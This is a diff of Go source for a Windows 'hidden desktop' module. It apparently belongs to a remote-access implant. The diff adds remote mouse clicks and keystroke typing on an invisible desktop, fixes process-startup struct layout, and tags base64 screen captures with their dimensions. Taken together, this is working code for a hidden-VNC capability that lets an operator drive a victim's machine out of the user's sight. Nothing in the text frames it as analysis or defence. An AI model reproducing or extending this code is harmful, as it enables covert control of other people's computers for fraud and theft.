@@ -27,6 +27,8 @@ var (
 	procReleaseDC         = hdUser32.NewProc("ReleaseDC")
 	procGetSystemMetrics  = hdUser32.NewProc("GetSystemMetrics")
 	procKeybdEvent        = hdUser32.NewProc("keybd_event")
+	procMouseEvent        = hdUser32.NewProc("mouse_event")
+	procVkKeyScanW        = hdUser32.NewProc("VkKeyScanW")
 	procCreateCompatibleDC = hdGdi32.NewProc("CreateCompatibleDC")
 	procCreateCompatibleBitmap = hdGdi32.NewProc("CreateCompatibleBitmap")
 	procSelectObject      = hdGdi32.NewProc("SelectObject")
@@ -45,10 +47,17 @@ const (
 	hdSwShow              = 5
 	hdCreateUnicodeEnv    = 0x400
 	hdKeyUp               = 0x2
+	hdMouseMove           = 0x0001
+	hdMouseLeftDown       = 0x0002
+	hdMouseLeftUp         = 0x0004
+	hdMouseRightDown      = 0x0008
+	hdMouseRightUp        = 0x0010
+	hdMouseAbsolute       = 0x8000
 )
 
 type hdStartupInfo struct {
 	cb            uint32
+	_             uint32
 	reserved      *uint16
 	desktop       *uint16
 	title         *uint16
@@ -62,6 +71,7 @@ type hdStartupInfo struct {
 	flags         uint32
 	showWindow    uint16
 	cbReserved2   uint16
+	_pad          uint32
 	lpReserved2   *byte
 	stdInput      syscall.Handle
 	stdOutput     syscall.Handle
@@ -119,6 +129,12 @@ func handleHiddenDesktop(cmd string) string {
 			vk = 13
 		}
 		return hdKey(vk)
+	case "click":
+		return hdClick(arg, false)
+	case "rclick":
+		return hdClick(arg, true)
+	case "type":
+		return hdType(arg)
 	case "stop":
 		return hdStop()
 	default:
@@ -157,12 +173,12 @@ func hdStart(exe string) string {
 	if err != nil {
 		return "bad command: " + err.Error()
 	}
-	var si hdStartupInfo
-	si.cb = uint32(unsafe.Sizeof(si))
-	si.desktop = desktop
-	si.flags = hdStartfUseShowWindow
-	si.showWindow = hdSwShow
-	var pi hdProcessInfo
+	var si syscall.StartupInfo
+	si.Cb = uint32(unsafe.Sizeof(si))
+	si.Desktop = desktop
+	si.Flags = hdStartfUseShowWindow
+	si.ShowWindow = hdSwShow
+	var pi syscall.ProcessInformation
 	ok, _, callErr := procCreateProcessW.Call(
 		0,
 		uintptr(unsafe.Pointer(&cmd[0])),
@@ -175,9 +191,9 @@ func hdStart(exe string) string {
 	if ok == 0 {
 		return "spawn failed: " + callErr.Error()
 	}
-	procCloseHandle.Call(uintptr(pi.process))
-	procCloseHandle.Call(uintptr(pi.thread))
-	return fmt.Sprintf("desktop started pid=%d", pi.pid)
+	procCloseHandle.Call(uintptr(pi.Process))
+	procCloseHandle.Call(uintptr(pi.Thread))
+	return fmt.Sprintf("desktop started pid=%d", pi.ProcessId)
 }
 
 func hdFrame() string {
@@ -253,7 +269,7 @@ func hdCapture() string {
 	binary.LittleEndian.PutUint16(file[26:], 1)
 	binary.LittleEndian.PutUint16(file[28:], 24)
 	copy(file[54:], pixels)
-	return "HDIMG:" + base64.StdEncoding.EncodeToString(file)
+	return fmt.Sprintf("HDIMG:%d,%d:", sw, sh) + base64.StdEncoding.EncodeToString(file)
 }
 
 func hdKey(vk int) string {
@@ -273,6 +289,92 @@ func hdKey(vk int) string {
 		done <- fmt.Sprintf("key %d", vk)
 	}()
 	return <-done
+}
+
+func hdOnDesktop(fn func() string) string {
+	if err := hdEnsure(); err != nil {
+		return "desktop open failed: " + err.Error()
+	}
+	done := make(chan string, 1)
+	go func() {
+		defer func() {
+			if rec := recover(); rec != nil {
+				done <- fmt.Sprintf("desktop error: %v", rec)
+			}
+		}()
+		runtime.LockOSThread()
+		defer runtime.UnlockOSThread()
+		if r, _, err := procSetThreadDesktop.Call(uintptr(hdDesktop)); r == 0 {
+			done <- "set desktop failed: " + err.Error()
+			return
+		}
+		done <- fn()
+	}()
+	return <-done
+}
+
+func hdClick(arg string, right bool) string {
+	fields := strings.Fields(arg)
+	if len(fields) < 2 {
+		return "click needs x y"
+	}
+	x, errX := strconv.Atoi(fields[0])
+	y, errY := strconv.Atoi(fields[1])
+	if errX != nil || errY != nil {
+		return "click needs x y"
+	}
+	return hdOnDesktop(func() string {
+		sw, _, _ := procGetSystemMetrics.Call(0)
+		sh, _, _ := procGetSystemMetrics.Call(1)
+		if sw == 0 || sh == 0 {
+			sw, sh = 1024, 768
+		}
+		ax := uintptr(x) * 65535 / sw
+		ay := uintptr(y) * 65535 / sh
+		procMouseEvent.Call(hdMouseAbsolute|hdMouseMove, ax, ay, 0, 0)
+		if right {
+			procMouseEvent.Call(hdMouseRightDown, 0, 0, 0, 0)
+			procMouseEvent.Call(hdMouseRightUp, 0, 0, 0, 0)
+			return fmt.Sprintf("rclick %d %d", x, y)
+		}
+		procMouseEvent.Call(hdMouseLeftDown, 0, 0, 0, 0)
+		procMouseEvent.Call(hdMouseLeftUp, 0, 0, 0, 0)
+		return fmt.Sprintf("click %d %d", x, y)
+	})
+}
+
+func hdType(text string) string {
+	if text == "" {
+		return "type needs text"
+	}
+	return hdOnDesktop(func() string {
+		for _, r := range text {
+			hdTypeRune(r)
+		}
+		return fmt.Sprintf("typed %d", len([]rune(text)))
+	})
+}
+
+func hdTypeRune(r rune) {
+	if r == '\n' || r == '\r' {
+		procKeybdEvent.Call(13, 0, 0, 0)
+		procKeybdEvent.Call(13, 0, hdKeyUp, 0)
+		return
+	}
+	vkPair, _, _ := procVkKeyScanW.Call(uintptr(r))
+	vk := byte(vkPair)
+	if vk == 0xFF {
+		return
+	}
+	shift := (vkPair >> 8) & 1
+	if shift != 0 {
+		procKeybdEvent.Call(0x10, 0, 0, 0)
+	}
+	procKeybdEvent.Call(uintptr(vk), 0, 0, 0)
+	procKeybdEvent.Call(uintptr(vk), 0, hdKeyUp, 0)
+	if shift != 0 {
+		procKeybdEvent.Call(0x10, 0, hdKeyUp, 0)
+	}
 }
 
 func hdStop() string {
